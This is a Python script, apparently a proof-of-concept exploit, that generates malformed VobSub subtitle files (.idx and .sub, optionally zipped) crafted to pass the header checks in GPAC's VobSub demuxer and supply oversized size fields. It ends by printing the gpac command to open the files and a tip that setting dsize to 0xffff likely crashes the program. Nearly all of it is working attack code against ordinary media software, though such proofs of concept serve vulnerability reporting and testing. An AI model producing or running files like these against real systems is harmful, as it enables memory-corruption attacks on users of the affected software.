#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse, os, struct, zipfile

def be16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)

def build_idx(lang="en", index=0, filepos=0) -> bytes:
    lines = [
        "# VobSub index file, v7 (do not modify this line!)",
        "# minimal PoC for GPAC vobsub demux",
        "size: 720x480",
        "palette: 000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff",
        f"id: {lang}, index: {index}",
        f"timestamp: 00:00:00:000, filepos: {filepos:016x}",
        ""
    ]
    return ("\n".join(lines)).encode("ascii")

def build_sub_packet(psize: int, dsize: int, hdrlen: int = 5, stream_id: int = 0x20) -> bytes:
    """
    Make a single 0x800 chunk that passes GPAC dmx_vobsub.c header checks:

    Checks (dmx_vobsub.c:292-299):
      *(u32*)&buf[0] == 0xba010000  -> bytes 00 00 01 BA at offset 0
      buf[14..17] == 00 00 01 BD
      buf[0x15] & 0x80             -> offset 21 has 0x80
      (buf[0x17] & 0xF0) == 0x20   -> offset 23 is 0x21
      (buf[buf[0x16]+0x17] & 0xE0) == 0x20 -> stream_id at offset (23+hdrlen)
    Then it reads:
      psize at buf[hdrlen+0x18..0x19] (offset 24+hdrlen)
      dsize at buf[hdrlen+0x1A..0x1B] (offset 26+hdrlen)
    And copies payload starting from offset (0x18+hdrlen) => our psize field becomes packet[0..1].
    """
    if not (0 <= hdrlen <= 255):
        raise ValueError("hdrlen must be 0..255")
    if not (0x20 <= stream_id <= 0x3F):
        raise ValueError("stream_id should be 0x20..0x3F to pass (&0xE0)==0x20")
    if psize <= 0:
        raise ValueError("psize must be > 0")
    if dsize < 0:
        raise ValueError("dsize must be >= 0")

    buf = bytearray(b"\x00" * 0x800)

    # pack header
    buf[0:4] = b"\x00\x00\x01\xBA"

    # private_stream_1 PES start code at offset 14
    buf[14:18] = b"\x00\x00\x01\xBD"

    # PES length (not strictly checked here)
    buf[18:20] = b"\x00\x00"

    # PES flags + header length
    buf[20] = 0x80
    buf[21] = 0x80          # must satisfy (buf[0x15] & 0x80)
    buf[22] = hdrlen & 0xFF # buf[0x16]

    # first byte of optional header at buf[23] must satisfy (buf[0x17]&0xF0)==0x20
    if hdrlen >= 1:
        buf[23] = 0x21
        for i in range(1, hdrlen):
            buf[23+i] = 0x00
    else:
        # hdrlen=0 still needs buf[23] to satisfy the check, so keep it 0x21
        buf[23] = 0x21

    # stream id at buf[23+hdrlen]
    sid_off = 23 + hdrlen
    buf[sid_off] = stream_id & 0xFF

    # psize/dsize at buf[24+hdrlen ...]
    p_off = 24 + hdrlen
    buf[p_off:p_off+2] = be16(psize)
    buf[p_off+2:p_off+4] = be16(dsize)

    # remaining payload zeros
    if p_off + psize > len(buf):
        raise ValueError("psize too large for single 0x800 chunk")
    return bytes(buf)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="poc_vobsub", help="output base name")
    ap.add_argument("--psize", default="0x20", help="psize (hex/dec)")
    ap.add_argument("--dsize", default=None, help="dsize (hex/dec), default=psize-1")
    ap.add_argument("--hdrlen", default="5", help="PES header_data_length (0..255)")
    ap.add_argument("--stream-id", default="0x20", help="subpicture stream id 0x20..0x3F")
    ap.add_argument("--filepos", default="0x0", help="filepos in .sub (hex/dec), default=0")
    ap.add_argument("--zip", action="store_true", help="also zip idx+sub")
    args = ap.parse_args()

    out = args.out
    psize = int(args.psize, 0)
    hdrlen = int(args.hdrlen, 0)
    stream_id = int(args.stream_id, 0)
    filepos = int(args.filepos, 0)

    dsize = (psize - 1) if args.dsize is None else int(args.dsize, 0)

    idx_data = build_idx(lang="en", index=0, filepos=filepos)
    sub_pkt = build_sub_packet(psize=psize, dsize=dsize, hdrlen=hdrlen, stream_id=stream_id)

    idx_path = out + ".idx"
    sub_path = out + ".sub"
    zip_path = out + ".zip"

    with open(idx_path, "wb") as f:
        f.write(idx_data)

    if filepos == 0:
        sub_data = sub_pkt
    else:
        sub_data = (b"\x00" * filepos) + sub_pkt

    with open(sub_path, "wb") as f:
        f.write(sub_data)

    if args.zip:
        with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.write(idx_path, os.path.basename(idx_path))
            z.write(sub_path, os.path.basename(sub_path))
        print(f"[+] wrote {idx_path} {sub_path} {zip_path}")
    else:
        print(f"[+] wrote {idx_path} {sub_path}")

    print("[*] run:")
    print(f"    gpac -i {idx_path} inspect:deep")
    print("[*] tip: for likely-crash even without ASAN, try: --dsize 0xffff")

if __name__ == "__main__":
    main()
